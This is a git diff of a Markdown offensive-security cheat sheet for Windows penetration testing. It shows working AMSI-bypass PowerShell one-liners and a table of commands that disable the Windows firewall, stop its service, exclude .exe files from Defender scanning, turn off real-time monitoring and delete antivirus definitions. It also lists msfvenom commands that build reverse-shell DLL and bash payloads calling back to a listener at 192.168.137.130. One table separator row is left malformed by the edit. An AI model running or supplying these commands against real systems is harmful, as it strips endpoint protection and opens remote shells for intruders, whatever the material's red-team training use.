@@ -8,7 +8,7 @@
 - [2. Map The Network](#Map-The-Network)
 - [3. AMSI-Bypass](#AMSI-Bypass)
 - [4. Windows Privilege Escalation](#Windows-Privilege-Escalation)
-- [5. Disable Defender](#Disable-Defender)
+- [5. Windows Defender/Firewall Commands](#Windows-Defender/Firewall-Commands)
 - [6. Useful Basic Commands](#Useful-Basic-Commands)
 - [7. Escalate to SYSTEM via Schedule Task](#Escalate-to-SYSTEM-via-Schedule-Task)
 - [8. Enable RDP and RestrictedAdmin](#Enable-RDP-and-RestrictedAdmin)
@@ -16,7 +16,7 @@
 - [10. MSSQL Useful Queries](#MSSQL-Useful-Queries)
 - [11. MSSQLPwner](#MSSQLPwner)
 - [12. NTLM Relay](#NTLM-Relay)
-- [13. MSFVenom Payload Generation](#MSFVenom-Payload-Generation)
+- [13. MSFVenom Payload Generation Cheetsheet](#MSFVenom-Payload-Generation-Cheetsheet)
 - [14. Domain Enumeration](#Domain-Enumeration)
 
 
@@ -73,14 +73,21 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 (([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
 ```
 
-# Disable Defender
+# Windows Defender/Firewall Commands
 
-```
-netsh advfirewall set allprofiles state off
-Firewall rules netsh advfirewall firewall show rule name=all
-Add-MpPreference -ExclusionExtension ".exe"
-Set-MpPreference -DisableRealtimeMonitoring $true
-```
+| Description                                        | Command                                                                               |
+| -------------------------------------------------- | ------------------------------------------------------------------------------------- |
+| Disable firewall - New way                         | `netsh advfirewall set allprofiles state off`                                         |
+|                                                    |                                                                                       |
+| Disable Firewall - Old way                         | `netsh firewall set opmode disable`                                                   |
+| Disable firewall service (can only run as SYSTEM?) | `net stop mpssvc`                                                                     |
+| Current firewall profile                           | `netsh advfirewall show currentprofile`                                               |
+| Firewall rules                                     | `netsh advfirewall firewall show rule name=all`                                       |
+| Show open ports                                    | `netstat -ano`                                                                        |
+| Network Information                                | `ipconfig /all`                                                                       |
+| EXE Exclusion                                      | `Add-MpPreference -ExclusionExtension ".exe"`                                         |
+| Turn off Virus & Threat Detection                  | `Set-MpPreference -DisableRealtimeMonitoring $true`                                   |
+| Remove all definitions                             | `cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all` |
 
 
 # Useful Basic Commands
@@ -279,7 +286,7 @@ impacket:
 # MSFVenom Payload Generation
 
 | Name                            | Payload                                                                                                                                                                                                                        |     |     |
-| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --- | --- |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
 | msfvenom DLL 64bit              | `msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f dll LHOST=192.168.137.130 LPORT=9500 > reverse_64bit.dll`                                                                                                                  |     |     |
 | msfvenom DLL 32bit              | `msfvenom -p windows/reverse_tcp -ax86 -f dll LHOST=192.168.137.130 LPORT=9500 > reverse_32bit.dll`                                                                                                                            |     |     |
 | BASH Reverse shell              | `msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw > shell.sh`                                                                                                                                                      |     |     |
